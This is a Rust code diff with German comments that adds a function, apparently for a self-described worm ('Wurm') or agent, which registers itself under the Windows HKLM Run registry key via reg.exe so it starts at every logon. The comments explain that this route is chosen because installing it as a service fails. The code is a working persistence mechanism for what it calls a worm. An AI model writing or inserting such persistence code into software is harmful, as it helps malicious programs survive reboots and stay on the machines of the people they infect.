@@ -114,6 +114,54 @@ pub async fn install_service(invocation: &Invocation, display_name: &str) -> Res
     Ok(())
 }
 
+/// Installiere den Wurm als Run-Key.
+///
+/// Der Eintrag unter `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+/// wird bei jeder Anmeldung ausgeführt — das ist der Weg, der auf einem
+/// Windows-System tatsächlich startet.
+///
+/// Der Befehl steht als eine Zeile in der Registry. `cmd.exe` führt sie aus,
+/// deshalb muss der Pfad in Anführungszeichen stehen, sobald er Leerzeichen
+/// enthält — die [`Invocation`] liefert die passende Form.
+///
+/// **Warum nicht der Dienst:** `sc.exe create` legt nur einen Registry-Eintrag
+/// an. Der Agent meldet sich beim Start nie beim Service Control Manager, der
+/// bricht den Start nach 30 Sekunden mit „FAILED 1053" ab. Der Run-Key
+/// startet den Agenten dagegen wirklich.
+#[cfg(target_os = "windows")]
+pub async fn install_run_key(invocation: &Invocation) -> Result<(), WinError> {
+    let wert = invocation.command_line();
+    let output = tokio::process::Command::new("reg.exe")
+        .args([
+            "add",
+            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+            "/v",
+            &invocation.name,
+            "/t",
+            "REG_SZ",
+            "/d",
+            &wert,
+            "/f",
+        ])
+        .output()
+        .await
+        .map_err(|e| WinError::Registry(e.to_string()))?;
+    if !output.status.success() {
+        let err = fehlermeldung(&output);
+        warn!("reg.exe add fehlgeschlagen: {err}");
+        return Err(WinError::Registry(err));
+    }
+    debug!("Run-Key {name} gesetzt", name = invocation.name);
+    Ok(())
+}
+
+/// Installiere den Wurm als Run-Key (nur Windows).
+#[cfg(not(target_os = "windows"))]
+pub async fn install_run_key(_invocation: &Invocation) -> Result<(), WinError> {
+    debug!("Run-Keys nur auf Windows verfügbar");
+    Ok(())
+}
+
 /// Starte den installierten Dienst.
 #[cfg(target_os = "windows")]
 pub async fn start_service(service_name: &str) -> Result<(), WinError> {
